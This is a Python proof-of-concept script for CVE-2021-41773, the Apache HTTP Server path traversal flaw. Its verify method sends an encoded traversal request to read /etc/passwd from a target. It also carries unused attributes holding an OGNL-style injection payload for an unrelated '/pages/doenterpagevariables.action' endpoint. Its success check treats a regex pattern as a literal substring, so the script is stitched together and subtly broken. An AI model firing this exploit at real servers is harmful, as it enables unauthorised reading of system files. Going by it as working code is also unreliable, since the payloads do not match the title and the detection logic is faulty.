# title: Apache HTTP Server 路径遍历漏洞验证 CVE-2021-41773
# author: fsm
# cveid: CVE-2021-41773


from poctools import BasicPoc


class ApacheHTTPServerConsolePoc(BasicPoc):

    path = "/pages/doenterpagevariables.action"
    payload = "queryString=aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D%7D%2B%5Cu0027bbb"
    validate = "aaa{class java.lang.String=null}bbb"

    def __init__(self) -> None:
        super(ApacheHTTPServerConsolePoc, self).__init__()
        self.name = "ApacheHTTPServer路径遍历漏洞验证"

    def verify(self, url: str) -> bool:
        target_url = url.rstrip('/')+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        try:
            resp = self.get(target_url)
            if "root:.*:0:0:" in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = "http://127.0.0.1:8080"
    poc = ApacheHTTPServerConsolePoc()
    result = poc.run(target)
    print(f"{target} -> {result}")